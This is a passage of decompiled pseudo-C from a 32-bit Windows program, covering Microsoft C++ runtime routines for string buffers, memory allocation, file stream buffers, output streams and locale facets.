  unsigned int v4; // ecx
  void *v5; // ebx
  size_t v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // ecx
  void *v13; // eax
  unsigned int v14; // [esp+Ch] [ebp-Ch]
  _DWORD *v15; // [esp+10h] [ebp-8h]

  v4 = (unsigned int)this[5];
  v14 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_4257D0();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v12 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v12 = 0;
    }
    else
    {
      v10 = v9 + 35;
      if ( v9 + 35 <= v9 )
        v10 = -1;
      v11 = operator new(v10);
      if ( !v11 )
        goto LABEL_26;
      v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
      *(v12 - 1) = v11;
    }
    v15 = v12;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memset(v12, a3, Size);
    *((_BYTE *)v15 + Size) = 0;
    if ( v14 < 0x10 )
    {
LABEL_25:
      *this = v15;
      return this;
    }
    v13 = *this;
    if ( v14 + 1 < 0x1000 )
    {
LABEL_24:
      sub_46C87D(v13);
      goto LABEL_25;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_24;
    }
LABEL_26:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memset(v5, a3, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041EF80) --------------------------------------------------------
void **__thiscall sub_41EF80(void **this, void *a2, size_t Size)
{
  unsigned int v4; // ecx
  void *v5; // ebx
  size_t v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  void *v12; // ecx
  _DWORD *v13; // eax
  void *v14; // eax
  unsigned int v15; // [esp+Ch] [ebp-Ch]
  _DWORD *v16; // [esp+14h] [ebp-4h]

  v4 = (unsigned int)this[5];
  v15 = v4;
  if ( Size > v4 )
  {
    if ( Size > 0x7FFFFFFF )
      sub_4257D0();
    v7 = Size | 0xF;
    if ( (Size | 0xF) <= 0x7FFFFFFF )
    {
      v8 = v4 >> 1;
      if ( v4 <= 0x7FFFFFFF - (v4 >> 1) )
      {
        if ( v7 < v8 + v4 )
          v7 = v8 + v4;
      }
      else
      {
        v7 = 0x7FFFFFFF;
      }
    }
    else
    {
      v7 = 0x7FFFFFFF;
    }
    v9 = __CFADD__(v7, 1) ? -1 : v7 + 1;
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v13 = operator new(__CFADD__(v7, 1) ? -1 : v7 + 1);
      else
        v13 = 0;
    }
    else
    {
      v10 = v9 + 35;
      if ( v9 + 35 <= v9 )
        v10 = -1;
      v11 = operator new(v10);
      v12 = v11;
      if ( !v11 )
        goto LABEL_26;
      v13 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
      *(v13 - 1) = v12;
    }
    v16 = v13;
    this[4] = (void *)Size;
    this[5] = (void *)v7;
    memmove(v13, a2, Size);
    *((_BYTE *)v16 + Size) = 0;
    if ( v15 < 0x10 )
    {
LABEL_25:
      *this = v16;
      return this;
    }
    v14 = *this;
    if ( v15 + 1 < 0x1000 )
    {
LABEL_24:
      sub_46C87D(v14);
      goto LABEL_25;
    }
    if ( (unsigned int)v14 - *((_DWORD *)v14 - 1) - 4 <= 0x1F )
    {
      v14 = (void *)*((_DWORD *)v14 - 1);
      goto LABEL_24;
    }
LABEL_26:
    _invalid_parameter_noinfo_noreturn();
  }
  v5 = this;
  if ( v4 >= 0x10 )
    v5 = *this;
  this[4] = (void *)Size;
  memmove_0(v5, a2, Size);
  *((_BYTE *)v5 + Size) = 0;
  return this;
}
// 4257D0: using guessed type void __noreturn sub_4257D0(void);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041F0C0) --------------------------------------------------------
void **__thiscall sub_41F0C0(char *this, size_t Size, char a3)
{
  unsigned int v3; // ebx
  unsigned int v5; // edx
  int v6; // ecx
  char *v7; // eax
  char *v8; // esi

  v3 = Size;
  v5 = *((_DWORD *)this + 5);
  v6 = *((_DWORD *)this + 4);
  if ( Size > v5 - v6 )
  {
    LOBYTE(Size) = 0;
    return sub_424E00((void **)this, v3, Size, v3, a3);
  }
  else
  {
    *((_DWORD *)this + 4) = v6 + Size;
    v7 = this;
    if ( v5 >= 0x10 )
      v7 = *(char **)this;
    v8 = &v7[v6];
    memset(&v7[v6], a3, Size);
    v8[Size] = 0;
    return (void **)this;
  }
}

//----- (0041F120) --------------------------------------------------------
void **__thiscall sub_41F120(char *this, void *Src, size_t Size)
{
  unsigned int v3; // ebx
  unsigned int v5; // edx
  int v6; // ecx
  char *v7; // eax
  char *v8; // esi
  size_t v10; // [esp-4h] [ebp-Ch]

  v3 = Size;
  v5 = *((_DWORD *)this + 5);
  v6 = *((_DWORD *)this + 4);
  if ( Size > v5 - v6 )
  {
    v10 = Size;
    LOBYTE(Size) = 0;
    return sub_424F60((void **)this, v3, Size, Src, v10);
  }
  else
  {
    *((_DWORD *)this + 4) = v6 + Size;
    v7 = this;
    if ( v5 >= 0x10 )
      v7 = *(char **)this;
    v8 = &v7[v6];
    memmove_0(&v7[v6], Src, Size);
    v8[Size] = 0;
    return (void **)this;
  }
}

//----- (0041F1B0) --------------------------------------------------------
char __thiscall sub_41F1B0(void *this)
{
  int v2; // eax
  int v3; // eax
  int v5; // edi
  char *v6; // [esp+8h] [ebp-28h] BYREF
  char Buffer[32]; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+2Ch] [ebp-4h] BYREF

  if ( !*((_DWORD *)this + 14) || !*((_BYTE *)this + 62) )
    return 1;
  if ( (*(unsigned __int16 (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, 0xFFFF) == 0xFFFF )
    return 0;
  v2 = (*(int (__thiscall **)(_DWORD, int, char *, int *, char **))(**((_DWORD **)this + 14) + 32))(
         *((_DWORD *)this + 14),
         (int)this + 64,
         Buffer,
         &v8,
         &v6);
  if ( v2 )
  {
    v3 = v2 - 1;
    if ( v3 )
      return v3 == 2;
  }
  else
  {
    *((_BYTE *)this + 62) = 0;
  }
  if ( v6 != Buffer )
  {
    v5 = v6 - Buffer;
    if ( v5 != fwrite(Buffer, 1u, v6 - Buffer, *((FILE **)this + 19)) )
      return 0;
  }
  return *((_BYTE *)this + 62) == 0;
}

//----- (0041F280) --------------------------------------------------------
int __thiscall sub_41F280(int this, int a2, int a3)
{
  _DWORD *v4; // ecx
  int result; // eax

  v4 = (_DWORD *)(this + 8);
  *(_BYTE *)(this + 72) = a3 == 1;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 62) = 0;
  *(_DWORD *)(this + 16) = v4;
  *v4 = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  *(_DWORD *)(this + 76) = a2;
  *(_DWORD *)(this + 64) = dword_4F15AC;
  result = dword_4F15B0;
  *(_DWORD *)(this + 68) = dword_4F15B0;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 4F15AC: using guessed type int dword_4F15AC;
// 4F15B0: using guessed type int dword_4F15B0;

//----- (0041F310) --------------------------------------------------------
int __thiscall sub_41F310(int this)
{
  int v2; // edi
  int result; // eax

  if ( *(_DWORD *)(this + 76) )
  {
    v2 = this;
    if ( !sub_41F1B0((void *)this) )
      v2 = 0;
    if ( fclose(*(FILE **)(this + 76)) )
      v2 = 0;
  }
  else
  {
    v2 = 0;
  }
  *(_BYTE *)(this + 72) = 0;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 16) = this + 8;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 62) = 0;
  *(_DWORD *)(this + 8) = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  result = v2;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  *(_DWORD *)(this + 76) = 0;
  *(_DWORD *)(this + 64) = dword_4F15AC;
  *(_DWORD *)(this + 68) = dword_4F15B0;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 4F15AC: using guessed type int dword_4F15AC;
// 4F15B0: using guessed type int dword_4F15B0;

//----- (0041F3D0) --------------------------------------------------------
_DWORD *__thiscall sub_41F3D0(_DWORD *this, wchar_t *a2, int a3, int a4)
{
  FILE *v5; // eax
  char *v6; // edi
  void (__thiscall ***v7)(_DWORD, int); // eax
  char v9[4]; // [esp+10h] [ebp-1Ch] BYREF
  int v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+18h] [ebp-14h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( this[19] )
    return 0;
  v5 = sub_46A575(a2, a3, 64);
  if ( !v5 )
    return 0;
  sub_41F280((int)this, (int)v5, 1);
  v12 = 0;
  v10 = *(_DWORD *)(this[13] + 4);
  (*(void (**)(void))(*(_DWORD *)v10 + 4))();
  v11 = 1;
  v6 = sub_4219F0((int)v9);
  if ( (*(unsigned __int8 (__thiscall **)(char *))(*(_DWORD *)v6 + 12))(v6) )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v6;
    sub_4210E0(this);
  }
  v11 = 0;
  v12 = -1;
  if ( v10 )
  {
    v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v7 )
      (**v7)(v7, 1);
  }
  return this;
}
// 41F3D0: using guessed type char var_1C[4];

//----- (0041F4D0) --------------------------------------------------------
_DWORD *__thiscall sub_41F4D0(_DWORD *this, int a2)
{
  _DWORD *v2; // esi

  *this = &std::wstreambuf::`vftable';
  v2 = operator new(8u);
  *(_QWORD *)v2 = 0i64;
  v2[1] = std::locale::_Init(1);
  this[4] = this + 2;
  this[3] = this + 1;
  this[13] = v2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  this[3] = this + 1;
  *this = &std::wfilebuf::`vftable';
  *((_BYTE *)this + 72) = 0;
  *((_BYTE *)this + 62) = 0;
  this[4] = this + 2;
  this[12] = this + 10;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  this[19] = a2;
  this[16] = dword_4F15AC;
  this[17] = dword_4F15B0;
  this[14] = 0;
  return this;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4BD57C: using guessed type void *std::wstreambuf::`vftable';
// 4BD5BC: using guessed type void *std::wfilebuf::`vftable';
// 4F15AC: using guessed type int dword_4F15AC;
// 4F15B0: using guessed type int dword_4F15B0;

//----- (0041F640) --------------------------------------------------------
_DWORD *__thiscall sub_41F640(_DWORD *this, int a2, char a3, int a4)
{
  if ( a4 )
  {
    *this = &unk_4CF2D4;
    this[2] = &std::ios_base::`vftable';
    this[2] = &std::wios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::wostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  sub_4211D0((int)this + *(_DWORD *)(*this + 4), a2, a3);
  return this;
}
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4BD5FC: using guessed type void *std::wios::`vftable';
// 4BD604: using guessed type void *std::wostream::`vftable';

//----- (0041F6F0) --------------------------------------------------------
__int64 __thiscall sub_41F6F0(_DWORD **this)
{
  if ( *this[8] )
    return (int)*this[12];
  else
    return 0i64;
}

//----- (0041F710) --------------------------------------------------------
__int64 __thiscall sub_41F710(_DWORD **this)
{
  if ( *this[7] )
    return (int)*this[11];
  else
    return 0i64;
}

//----- (0041F730) --------------------------------------------------------
int __thiscall sub_41F730(int this, char a2, char a3)
{
  char v3; // al

  v3 = a2 | *(_BYTE *)(this + 12) | 4;
  if ( *(_DWORD *)(this + 56) )
    v3 = a2 | *(_BYTE *)(this + 12);
  return sub_4036A0((_DWORD *)this, v3, a3);
}

//----- (0041F760) --------------------------------------------------------
char __thiscall sub_41F760(void *this)
{
  int v2; // eax
  int v3; // eax
  int v5; // edi
  char *v6; // [esp+8h] [ebp-28h] BYREF
  char Buffer[32]; // [esp+Ch] [ebp-24h] BYREF
  int v8; // [esp+2Ch] [ebp-4h] BYREF

  if ( !*((_DWORD *)this + 14) || !*((_BYTE *)this + 61) )
    return 1;
  if ( (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 12))(this, -1) == -1 )
    return 0;
  v2 = (*(int (__thiscall **)(_DWORD, int, char *, int *, char **))(**((_DWORD **)this + 14) + 32))(
         *((_DWORD *)this + 14),
         (int)this + 64,
         Buffer,
         &v8,
         &v6);
  if ( v2 )
  {
    v3 = v2 - 1;
    if ( v3 )
      return v3 == 2;
  }
  else
  {
    *((_BYTE *)this + 61) = 0;
  }
  if ( v6 != Buffer )
  {
    v5 = v6 - Buffer;
    if ( v5 != fwrite(Buffer, 1u, v6 - Buffer, *((FILE **)this + 19)) )
      return 0;
  }
  return *((_BYTE *)this + 61) == 0;
}

//----- (0041F820) --------------------------------------------------------
int __thiscall sub_41F820(int this, FILE *Stream, int a3)
{
  _DWORD *v4; // ecx
  char **v5; // eax
  char **v6; // eax
  int *v7; // eax
  int result; // eax
  int *Count; // [esp+8h] [ebp-10h] BYREF
  char **Pointer; // [esp+Ch] [ebp-Ch] BYREF
  char **Base; // [esp+10h] [ebp-8h] BYREF

  v4 = (_DWORD *)(this + 8);
  *(_BYTE *)(this + 72) = a3 == 1;
  *(_DWORD *)(this + 12) = this + 4;
  *(_DWORD *)(this + 28) = this + 20;
  *(_DWORD *)(this + 32) = this + 24;
  *(_DWORD *)(this + 44) = this + 36;
  *(_DWORD *)(this + 48) = this + 40;
  *(_BYTE *)(this + 61) = 0;
  *(_DWORD *)(this + 16) = v4;
  *v4 = 0;
  **(_DWORD **)(this + 32) = 0;
  **(_DWORD **)(this + 48) = 0;
  **(_DWORD **)(this + 12) = 0;
  **(_DWORD **)(this + 28) = 0;
  **(_DWORD **)(this + 44) = 0;
  if ( Stream )
  {
    Base = 0;
    Pointer = 0;
    Count = 0;
    _get_stream_buffer_pointers(Stream, &Base, &Pointer, &Count);
    v5 = Base;
    *(_DWORD *)(this + 12) = Base;
    *(_DWORD *)(this + 16) = v5;
    v6 = Pointer;
    *(_DWORD *)(this + 28) = Pointer;
    *(_DWORD *)(this + 32) = v6;
    v7 = Count;
    *(_DWORD *)(this + 44) = Count;
    *(_DWORD *)(this + 48) = v7;
  }
  *(_DWORD *)(this + 76) = Stream;
  *(_DWORD *)(this + 64) = dword_4F153C;
  result = dword_4F1540;
  *(_DWORD *)(this + 68) = dword_4F1540;
  *(_DWORD *)(this + 56) = 0;
  return result;
}
// 4F153C: using guessed type int dword_4F153C;
// 4F1540: using guessed type int dword_4F1540;

//----- (0041F920) --------------------------------------------------------
_DWORD *__thiscall sub_41F920(_DWORD *this, wchar_t *a2, int a3, int a4)
{
  FILE *v5; // eax
  _DWORD *v6; // edi
  void (__thiscall ***v7)(_DWORD, int); // eax
  char v9[4]; // [esp+10h] [ebp-1Ch] BYREF
  int v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+18h] [ebp-14h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( this[19] )
    return 0;
  v5 = sub_46A575(a2, a3, a4);
  if ( !v5 )
    return 0;
  sub_41F820((int)this, v5, 1);
  v12 = 0;
  v10 = *(_DWORD *)(this[13] + 4);
  (*(void (**)(void))(*(_DWORD *)v10 + 4))();
  v11 = 1;
  v6 = sub_4245E0((int)v9);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*v6 + 12))(v6) )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v6;
    sub_4210E0(this);
  }
  v11 = 0;
  v12 = -1;
  if ( v10 )
  {
    v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v7 )
      (**v7)(v7, 1);
  }
  return this;
}
// 41F920: using guessed type char var_1C[4];

//----- (0041FA20) --------------------------------------------------------
_DWORD *__thiscall sub_41FA20(_DWORD *this, char *a2, int a3, int a4)
{
  FILE *v5; // eax
  _DWORD *v6; // edi
  void (__thiscall ***v7)(_DWORD, int); // eax
  char v9[4]; // [esp+10h] [ebp-1Ch] BYREF
  int v10; // [esp+14h] [ebp-18h]
  int v11; // [esp+18h] [ebp-14h]
  int v12; // [esp+28h] [ebp-4h]

  v11 = 0;
  if ( this[19] )
    return 0;
  v5 = sub_46A56C(a2, a3, a4);
  if ( !v5 )
    return 0;
  sub_41F820((int)this, v5, 1);
  v12 = 0;
  v10 = *(_DWORD *)(this[13] + 4);
  (*(void (**)(void))(*(_DWORD *)v10 + 4))();
  v11 = 1;
  v6 = sub_4245E0((int)v9);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*v6 + 12))(v6) )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v6;
    sub_4210E0(this);
  }
  v11 = 0;
  v12 = -1;
  if ( v10 )
  {
    v7 = (void (__thiscall ***)(_DWORD, int))(*(int (__thiscall **)(int))(*(_DWORD *)v10 + 8))(v10);
    if ( v7 )
      (**v7)(v7, 1);
  }
  return this;
}
// 41FA20: using guessed type char var_1C[4];

//----- (0041FB20) --------------------------------------------------------
_DWORD *__thiscall sub_41FB20(_DWORD *this, FILE *a2)
{
  _DWORD *v3; // esi

  *this = &std::streambuf::`vftable';
  v3 = operator new(8u);
  *(_QWORD *)v3 = 0i64;
  v3[1] = std::locale::_Init(1);
  this[13] = v3;
  this[3] = this + 1;
  this[4] = this + 2;
  this[7] = this + 5;
  this[8] = this + 6;
  this[11] = this + 9;
  this[12] = this + 10;
  this[2] = 0;
  *(_DWORD *)this[8] = 0;
  *(_DWORD *)this[12] = 0;
  *(_DWORD *)this[3] = 0;
  *(_DWORD *)this[7] = 0;
  *(_DWORD *)this[11] = 0;
  *this = &std::filebuf::`vftable';
  sub_41F820((int)this, a2, 0);
  return this;
}
// 469E4D: using guessed type struct std::locale::_Locimp *__cdecl std::locale::_Init(bool);
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B8584: using guessed type void *std::streambuf::`vftable';
// 4BBF48: using guessed type void *std::filebuf::`vftable';

//----- (0041FC00) --------------------------------------------------------
_DWORD *__stdcall sub_41FC00(size_t a1)
{
  size_t v1; // eax
  void *v2; // eax
  void *v3; // ecx
  _DWORD *result; // eax

  if ( a1 < 0x1000 )
  {
    if ( a1 )
      return operator new(a1);
    else
      return 0;
  }
  else
  {
    v1 = a1 + 35;
    if ( a1 + 35 <= a1 )
      v1 = -1;
    v2 = operator new(v1);
    v3 = v2;
    if ( !v2 )
      _invalid_parameter_noinfo_noreturn();
    result = (_DWORD *)(((unsigned int)v2 + 35) & 0xFFFFFFE0);
    *(result - 1) = v3;
  }
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0041FC60) --------------------------------------------------------
void __stdcall sub_41FC60(void *a1, unsigned int a2)
{
  void *v2; // eax

  v2 = a1;
  if ( a2 >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_46C87D(v2);
}

//----- (0041FCA0) --------------------------------------------------------
_DWORD *__thiscall sub_41FCA0(_DWORD *this, int a2, char a3, int a4)
{
  char *v5; // edi
  char v6; // al
  bool v7; // zf

  if ( a4 )
  {
    *this = &unk_4CF2D4;
    this[2] = &std::ios_base::`vftable';
    this[2] = &std::ios::`vftable';
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &std::ostream::`vftable';
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4) - 4) = *(_DWORD *)(*this + 4) - 8;
  v5 = (char *)this + *(_DWORD *)(*this + 4);
  sub_4037C0(v5);
  *((_DWORD *)v5 + 14) = a2;
  *((_DWORD *)v5 + 15) = 0;
  v6 = sub_421590(v5, 32);
  v7 = *((_DWORD *)v5 + 14) == 0;
  v5[64] = v6;
  if ( v7 )
    sub_4036A0(v5, *((_DWORD *)v5 + 3) | 4, 0);
  if ( a3 )
    std::ios_base::_Addstd((struct std::ios_base *)v5);
  return this;
}
// 46A325: using guessed type void __cdecl std::ios_base::_Addstd(struct std::ios_base *);
// 4B856C: using guessed type void *std::ios_base::`vftable';
// 4B8574: using guessed type void *std::ios::`vftable';
// 4B857C: using guessed type void *std::ostream::`vftable';

//----- (0041FD90) --------------------------------------------------------
int __thiscall sub_41FD90(void *this, int a2, int a3, int a4)
{
  return (*(int (__thiscall **)(void *, int, int, int))(*(_DWORD *)this + 36))(this, a2, a3, a4);
}

//----- (0041FDB0) --------------------------------------------------------
int __fastcall sub_41FDB0(char *a1, char *a2, int a3)
{
  int v3; // eax
  int v4; // edi
  bool v5; // cc
  unsigned __int16 v6; // si

  v3 = a3;
  if ( !a3 )
    return 0;
  if ( *(_WORD *)a1 < *(_WORD *)a2 )
    return -1;
  v4 = a1 - a2;
  v5 = *(_WORD *)a1 <= *(_WORD *)a2;
  while ( v5 )
  {
    if ( v3 == 1 )
      return 0;
    v6 = *(_WORD *)&a2[v4 + 2];
    a2 += 2;
    --v3;
    v5 = v6 <= *(_WORD *)a2;
    if ( v6 < *(_WORD *)a2 )
      return -1;
  }
  return 1;
}

//----- (0041FE10) --------------------------------------------------------
_DWORD *__thiscall sub_41FE10(_DWORD *this, char a2)
{
  *this = &std::codecvt<char,char,_Mbstatet>::`vftable';
  *this = &std::codecvt_base::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BBE24: using guessed type void *std::codecvt_base::`vftable';
// 4BBFE4: using guessed type void *std::codecvt<char,char,_Mbstatet>::`vftable';

//----- (0041FE90) --------------------------------------------------------
_DWORD *__thiscall sub_41FE90(_DWORD *this, char a2)
{
  *this = &std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';
  *this = &std::locale::facet::`vftable';
  *this = &std::_Facet_base::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4B8420: using guessed type void *std::_Facet_base::`vftable';
// 4B8430: using guessed type void *std::locale::facet::`vftable';
// 4BE60C: using guessed type void *std::num_put<wchar_t,std::ostreambuf_iterator<wchar_t>>::`vftable';

//----- (0041FF00) --------------------------------------------------------
int __thiscall sub_41FF00(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[5];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  *(_WORD *)a2 = 0;
  sub_41EB20((void **)a2, v2, wcslen((const unsigned __int16 *)v2));
  return a2;
}

//----- (0041FF90) --------------------------------------------------------
int __thiscall sub_41FF90(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[4];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 7;
  *(_WORD *)a2 = 0;
  sub_41EB20((void **)a2, v2, wcslen((const unsigned __int16 *)v2));
  return a2;
}

//----- (00420020) --------------------------------------------------------
int __thiscall sub_420020(_DWORD *this, int a2)
{
  void *v2; // edx

  v2 = (void *)this[2];
  *(_DWORD *)(a2 + 16) = 0;
  *(_DWORD *)(a2 + 20) = 15;
  *(_BYTE *)a2 = 0;
  sub_41EF80((void **)a2, v2, strlen((const char *)v2));
  return a2;
}

//----- (004200A0) --------------------------------------------------------
__int16 __thiscall sub_4200A0(_WORD *this)
{
  return this[7];
}

//----- (004200B0) --------------------------------------------------------
__int16 __thiscall sub_4200B0(_WORD *this)
{
  return this[6];
}

//----- (004200C0) --------------------------------------------------------
int __stdcall sub_4200C0(int a1, int a2)
{
  int result; // eax

  for ( result = a1; result != a2; result += 8 )
  {
    if ( *(_DWORD *)(result + 4) )
      terminate();
  }
  return result;
}
// 48CEC4: using guessed type void __noreturn terminate(void);

//----- (004200F0) --------------------------------------------------------
void __stdcall sub_4200F0(void *a1, int a2)
{
  void *v2; // ecx

  v2 = a1;
  if ( (unsigned int)(8 * a2) >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_46C87D(v2);
}

//----- (00420130) --------------------------------------------------------
void __noreturn sub_420130()
{
  sub_46A183((int)"vector<T> too long");
}
// 420130: using guessed type void __noreturn sub_420130();

//----- (00420140) --------------------------------------------------------
void __stdcall sub_420140(int a1, int a2)
{
  sub_425130(a1, a2);
}

//----- (00420160) --------------------------------------------------------
void __stdcall sub_420160(void *a1, int a2)
{
  void *v2; // ecx

  v2 = a1;
  if ( (unsigned int)(24 * a2) >= 0x1000 )
  {
    if ( (unsigned int)a1 - *((_DWORD *)a1 - 1) - 4 > 0x1F )
      _invalid_parameter_noinfo_noreturn();
    v2 = (void *)*((_DWORD *)a1 - 1);
  }
  sub_46C87D(v2);
}

//----- (004201A0) --------------------------------------------------------
int __thiscall sub_4201A0(int *this)
{
  int v1; // ecx
  int result; // eax
  int v3; // ecx

  v1 = *this;
  result = *(_DWORD *)(*(_DWORD *)v1 + 4);
  v3 = *(_DWORD *)(result + v1 + 56);
  if ( v3 )
    return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 8))(v3);
  return result;
}

//----- (004201F0) --------------------------------------------------------
_DWORD *__cdecl sub_4201F0(int a1, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6)
{
  _DWORD *v6; // edx
  _DWORD *v7; // ebx
  int v8; // esi
  int *v9; // ecx
  _WORD **v10; // ecx
  _WORD *v11; // edx
  __int16 v12; // ax
  _DWORD *result; // eax

  v6 = a4;
  v7 = a2;
  v8 = a6;
  if ( a6 )
  {
    do
    {
      if ( !v6 )
        goto LABEL_8;
      if ( *(_DWORD *)v6[8] && (v9 = (int *)v6[12], *v9 > 0) )
      {
        --*v9;
        v10 = (_WORD **)v6[8];
        v11 = (*v10)++;
        *v11 = a5;
        v12 = a5;
      }
      else
      {
        v12 = (*(int (__thiscall **)(_DWORD *, int))(*v6 + 12))(v6, a5);
      }
      v6 = a4;
      if ( v12 == -1 )
LABEL_8:
        LOBYTE(a3) = 1;
      --v8;
    }
    while ( v8 );
    v7 = a2;
  }
  result = v7;
  *v7 = a3;
  v7[1] = v6;
  return result;
}

//----- (00420270) --------------------------------------------------------
_DWORD *__cdecl sub_420270(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int a6)
{
  _DWORD *result; // eax
  _DWORD *v7; // edx
  int v8; // esi
  __int16 v10; // bx
  int *v11; // ecx
  _WORD **v12; // ecx
  _WORD *v13; // edx
  __int16 v14; // ax

  result = a2;
  v7 = a4;
  v8 = a6;
  if ( a6 )
  {
    do
    {
      if ( !v7 )
        goto LABEL_8;
      v10 = *a5;
      if ( *(_DWORD *)v7[8] && (v11 = (int *)v7[12], *v11 > 0) )
      {
        --*v11;
        v12 = (_WORD **)v7[8];
        v13 = (*v12)++;
        v14 = v10;
        *v13 = v10;
      }
      else
      {
        v14 = (*(int (__thiscall **)(_DWORD *, _DWORD))(*v7 + 12))(v7, *a5);
      }
      v7 = a4;
      if ( v14 == -1 )
LABEL_8:
        LOBYTE(a3) = 1;
      ++a5;
      --v8;
    }
    while ( v8 );
    result = a2;
  }
  *result = a3;
  result[1] = v7;
  return result;
}

//----- (00420300) --------------------------------------------------------
_DWORD *__cdecl sub_420300(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, _BYTE *a7, unsigned int a8)
{
  unsigned int v8; // edi
  int v9; // esi
  int v10; // eax
  char v11; // cl
